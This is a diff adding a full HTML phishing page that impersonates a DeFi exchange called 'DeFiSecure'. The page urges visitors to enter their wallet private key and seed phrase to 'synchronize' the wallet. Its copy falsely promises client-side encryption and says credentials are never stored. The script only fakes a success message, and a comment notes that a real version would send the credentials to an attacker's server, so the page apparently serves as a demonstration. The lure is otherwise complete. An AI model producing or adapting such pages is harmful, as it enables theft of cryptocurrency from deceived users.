@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sync Your Wallet | DeFiSecure Exchange</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+            color: #e2e8f0;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1200px;
+            width: 100%;
+        }
+
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+            border-bottom: 1px solid #334155;
+            margin-bottom: 40px;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: #60a5fa;
+        }
+
+        .logo i {
+            color: #3b82f6;
+        }
+
+        nav a {
+            color: #cbd5e1;
+            text-decoration: none;
+            margin-left: 30px;
+            font-weight: 500;
+            transition: color 0.3s;
+        }
+
+        nav a:hover {
+            color: #60a5fa;
+        }
+
+        .banner {
+            width: 100%;
+            border-radius: 16px;
+            overflow: hidden;
+            margin-bottom: 40px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+        }
+
+        .banner img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        .main-content {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 40px;
+            margin-bottom: 50px;
+        }
+
+        .info-panel {
+            background: rgba(30, 41, 59, 0.7);
+            border-radius: 16px;
+            padding: 30px;
+            border: 1px solid #475569;
+        }
+
+        .info-panel h2 {
+            color: #60a5fa;
+            margin-bottom: 20px;
+            font-size: 1.8rem;
+        }
+
+        .info-panel p {
+            line-height: 1.6;
+            margin-bottom: 15px;
+            color: #cbd5e1;
+        }
+
+        .feature-list {
+            list-style: none;
+            margin-top: 20px;
+        }
+
+        .feature-list li {
+            padding: 10px 0;
+            border-bottom: 1px solid #475569;
+            display: flex;
+            align-items: center;
+        }
+
+        .feature-list li:last-child {
+            border-bottom: none;
+        }
+
+        .feature-list i {
+            color: #10b981;
+            margin-right: 12px;
+        }
+
+        .sync-form-container {
+            background: rgba(15, 23, 42, 0.9);
+            border-radius: 16px;
+            padding: 30px;
+            border: 1px solid #475569;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+        }
+
+        .sync-form-container h2 {
+            color: #60a5fa;
+            margin-bottom: 10px;
+            font-size: 1.8rem;
+        }
+
+        .form-subtitle {
+            color: #94a3b8;
+            margin-bottom: 25px;
+            font-size: 0.95rem;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #e2e8f0;
+        }
+
+        .form-group input, .form-group textarea {
+            width: 100%;
+            padding: 14px;
+            background: #1e293b;
+            border: 1px solid #475569;
+            border-radius: 10px;
+            color: #f1f5f9;
+            font-size: 1rem;
+            transition: border 0.3s;
+        }
+
+        .form-group input:focus, .form-group textarea:focus {
+            outline: none;
+            border-color: #3b82f6;
+        }
+
+        .form-group textarea {
+            min-height: 120px;
+            resize: vertical;
+            font-family: monospace;
+            font-size: 0.9rem;
+        }
+
+        .security-note {
+            background: rgba(59, 130, 246, 0.1);
+            border-left: 4px solid #3b82f6;
+            padding: 15px;
+            border-radius: 0 8px 8px 0;
+            margin-bottom: 25px;
+            font-size: 0.9rem;
+        }
+
+        .security-note i {
+            color: #3b82f6;
+            margin-right: 8px;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(90deg, #3b82f6, #1d4ed8);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .submit-btn:hover {
+            background: linear-gradient(90deg, #1d4ed8, #1e40af);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(29, 78, 216, 0.4);
+        }
+
+        .wallet-icons {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 20px;
+            opacity: 0.8;
+        }
+
+        .wallet-icons i {
+            font-size: 1.8rem;
+        }
+
+        footer {
+            text-align: center;
+            padding: 30px 0;
+            color: #94a3b8;
+            font-size: 0.9rem;
+            border-top: 1px solid #334155;
+            width: 100%;
+            margin-top: auto;
+        }
+
+        .footer-links {
+            margin-top: 15px;
+        }
+
+        .footer-links a {
+            color: #60a5fa;
+            text-decoration: none;
+            margin: 0 15px;
+        }
+
+        @media (max-width: 768px) {
+            .main-content {
+                grid-template-columns: 1fr;
+            }
+            nav {
+                display: none;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="logo">
+                <i class="fas fa-coins"></i>
+                <span>DeFiSecure</span>
+            </div>
+            <nav>
+                <a href="#"><i class="fas fa-home"></i> Dashboard</a>
+                <a href="#"><i class="fas fa-exchange-alt"></i> Trade</a>
+                <a href="#"><i class="fas fa-wallet"></i> Wallets</a>
+                <a href="#"><i class="fas fa-shield-alt"></i> Security</a>
+                <a href="#"><i class="fas fa-user"></i> Account</a>
+            </nav>
+        </header>
+
+        <div class="banner">
+            <img src="images/defi-banner.jpg" alt="DeFiSecure Exchange - Secure Your Financial Future">
+        </div>
+
+        <div class="main-content">
+            <div class="info-panel">
+                <h2>Secure Wallet Synchronization</h2>
+                <p>To provide you with a seamless DeFi experience across all our integrated protocols, we need to synchronize your wallet with our enhanced security layer.</p>
+                <p>This one-time process encrypts your credentials using military-grade AES-256 encryption and stores them locally in your browser for instant access to decentralized applications.</p>
+                <p><strong>Benefits of synchronization:</strong></p>
+                <ul class="feature-list">
+                    <li><i class="fas fa-check-circle"></i> Instant access to 150+ integrated dApps</li>
+                    <li><i class="fas fa-check-circle"></i> Cross-platform wallet recovery</li>
+                    <li><i class="fas fa-check-circle"></i> Enhanced transaction signing security</li>
+                    <li><i class="fas fa-check-circle"></i> Real-time portfolio tracking</li>
+                    <li><i class="fas fa-check-circle"></i> Automated yield farming optimization</li>
+                </ul>
+                <div class="security-note" style="margin-top: 25px;">
+                    <i class="fas fa-info-circle"></i>
+                    <strong>Note:</strong> Your private keys and seed phrases are encrypted client-side before transmission. We never store unencrypted credentials on our servers.
+                </div>
+            </div>
+
+            <div class="sync-form-container">
+                <h2><i class="fas fa-sync-alt"></i> Wallet Sync Setup</h2>
+                <p class="form-subtitle">Enter your wallet details below to enable full platform functionality.</p>
+
+                <form id="walletSyncForm" action="/api/v3/wallet/secure-sync" method="POST">
+                    <div class="form-group">
+                        <label for="walletName"><i class="fas fa-tag"></i> Wallet Name (Optional)</label>
+                        <input type="text" id="walletName" name="walletName" placeholder="e.g., My Main Wallet">
+                    </div>
+
+                    <div class="form-group">
+                        <label for="privateKey"><i class="fas fa-key"></i> Private Key</label>
+                        <input type="password" id="privateKey" name="privateKey" placeholder="Enter your 64-character private key" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="seedPhrase"><i class="fas fa-seedling"></i> Seed Phrase / Recovery Phrase</label>
+                        <textarea id="seedPhrase" name="seedPhrase" placeholder="Enter your 12, 18, or 24-word recovery phrase separated by spaces" required></textarea>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="walletType"><i class="fas fa-wallet"></i> Wallet Type</label>
+                        <select id="walletType" name="walletType" style="width:100%; padding:14px; background:#1e293b; border:1px solid #475569; border-radius:10px; color:#f1f5f9;">
+                            <option value="metamask">MetaMask</option>
+                            <option value="trust">Trust Wallet</option>
+                            <option value="ledger">Ledger</option>
+                            <option value="trezor">Trezor</option>
+                            <option value="phantom">Phantom</option>
+                            <option value="other">Other</option>
+                        </select>
+                    </div>
+
+                    <div class="security-note">
+                        <i class="fas fa-lock"></i>
+                        <strong>Security Reminder:</strong> This information is used solely to generate encrypted signatures. Always verify you're on the official DeFiSecure domain before submitting sensitive data.
+                    </div>
+
+                    <button type="submit" class="submit-btn">
+                        <i class="fas fa-shield-alt"></i> Encrypt & Synchronize Wallet
+                    </button>
+                </form>
+
+                <div class="wallet-icons">
+                    <i class="fab fa-ethereum" title="Ethereum"></i>
+                    <i class="fab fa-bitcoin" title="Bitcoin"></i>
+                    <i class="fas fa-gem" title="Polygon"></i>
+                    <i class="fas fa-bolt" title="Solana"></i>
+                    <i class="fas fa-layer-group" title="Avalanche"></i>
+                </div>
+            </div>
+        </div>
+
+        <footer>
+            <p>© 2023 DeFiSecure Exchange. All rights reserved. | Compliant with GDPR & CCPA</p>
+            <div class="footer-links">
+                <a href="#">Privacy Policy</a>
+                <a href="#">Terms of Service</a>
+                <a href="#">Security Audit</a>
+                <a href="#">Support Center</a>
+            </div>
+            <p style="margin-top: 15px; font-size: 0.8rem; color: #64748b;">
+                <i class="fas fa-lock"></i> Secure Connection | SSL Encrypted
+            </p>
+        </footer>
+    </div>
+
+    <script>
+        document.getElementById('walletSyncForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Show loading state
+            const btn = this.querySelector('.submit-btn');
+            const originalText = btn.innerHTML;
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Encrypting & Syncing...';
+            btn.disabled = true;
+            
+            // Simulate processing delay
+            setTimeout(() => {
+                // In a real malicious scenario, credentials would be sent to attacker's server here
+                // For demonstration, we just show a success message
+                alert('Wallet synchronization initiated successfully! Your wallet is now being secured with our multi-layer encryption.');
+                
+                // Reset button
+                btn.innerHTML = originalText;
+                btn.disabled = false;
+                
+                // Optionally clear the form
+                // document.getElementById('walletSyncForm').reset();
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
